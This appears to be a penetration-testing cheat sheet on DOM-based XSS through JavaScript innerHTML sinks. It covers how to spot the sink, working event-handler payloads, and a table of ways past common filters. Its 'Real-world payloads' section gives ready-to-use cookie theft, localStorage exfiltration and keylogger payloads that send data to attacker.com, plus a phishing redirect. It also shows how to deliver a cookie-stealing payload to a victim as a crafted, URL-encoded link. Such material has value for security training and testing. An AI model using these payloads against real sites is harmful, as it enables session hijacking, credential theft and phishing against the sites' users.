# DOM XSS — innerHTML Sink

## What it is
The page takes attacker-controlled input and assigns it directly to an element's `innerHTML` property. The browser parses the string as raw HTML — anything you inject becomes part of the DOM.

**Key trait:** `innerHTML` will not execute `<script>` tags. The browser intentionally ignores them when injected this way. You need a different execution path.

---

## Where to look

- Search boxes whose results are reflected back ("0 results for X")
- Any element whose visible text is set via JavaScript (not server-side)
- Preview/render features (markdown preview, template preview, live search)
- Chat messages, comments, notifications rendered client-side
- Any JS code containing `.innerHTML =`, `.innerHTML+=`, `$(el).html()`

**How to spot it in source:**
```javascript
element.innerHTML = userInput;
element.innerHTML = location.search;
document.getElementById('x').innerHTML = params.get('q');
$('#x').html(userInput);
```

---

## Why `<script>` fails here

```html
<!-- Injected via innerHTML — browser parses but does NOT execute -->
<script>alert(1)</script>
```

This is a browser rule. Scripts injected after page load via `innerHTML` are dead on arrival.

---

## Payloads that work

Use HTML elements with event handlers that fire automatically — no user interaction needed:

```html
<!-- Image with broken src — onerror fires immediately -->
<img src=x onerror=alert(1)>

<!-- SVG with onload — fires as soon as element renders -->
<svg onload=alert(1)>

<!-- Video/audio — same pattern -->
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
```

**Common mistake:** writing `on error` (with a space) — that splits into two unknown attributes and neither fires. `onerror` is one word.

---

## Real-world payloads

```javascript
// Cookie theft
<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">

// Cookie theft via image request (no fetch, works on older browsers)
<img src=x onerror="new Image().src='https://attacker.com/?c='+document.cookie">

// localStorage exfil
<img src=x onerror="fetch('https://attacker.com/?d='+btoa(JSON.stringify(localStorage)))">

// Keylogger
<svg onload="document.onkeypress=function(e){fetch('https://attacker.com/?k='+e.key)}">

// Redirect to phishing page
<img src=x onerror="location='https://evil-clone.com'">
```

---

## Delivering the payload

`innerHTML` sinks are usually fed from `location.search` or `location.hash`. Craft a URL with the payload in the relevant parameter and deliver it to the victim:

```
https://target.com/search?q=<img src=x onerror="new Image().src='https://attacker.com/?c='+document.cookie">
```

URL-encode the payload before sending:
```
https://target.com/search?q=%3Cimg+src%3Dx+onerror%3D%22new+Image%28%29.src%3D'https%3A%2F%2Fattacker.com%2F%3Fc%3D'%2Bdocument.cookie%22%3E
```

---

## Filter bypasses

| Filter | Bypass |
|--------|--------|
| Blocks `onerror` | `onload` (use `<svg>` or `<body>`), `onfocus` + `autofocus` |
| Blocks `alert` | `confirm(1)`, `prompt(1)`, `console.log(1)` |
| Blocks `<img` | `<svg onload=alert(1)>`, `<video src=x onerror=alert(1)>` |
| Encodes `"` | Use unquoted attributes: `<img src=x onerror=alert(1)>` |
| Blocks `fetch` | `new Image().src=...`, `navigator.sendBeacon(...)` |

---

## Sink comparison

| Sink | `<script>` works? | Best payload |
|------|-------------------|--------------|
| `document.write()` | Yes | `<script>alert(1)</script>` |
| `innerHTML` | **No** | `<img src=x onerror=alert(1)>` |
| `eval()` | N/A | `alert(1)` (direct JS) |
| `href` attribute | N/A | `javascript:alert(1)` |
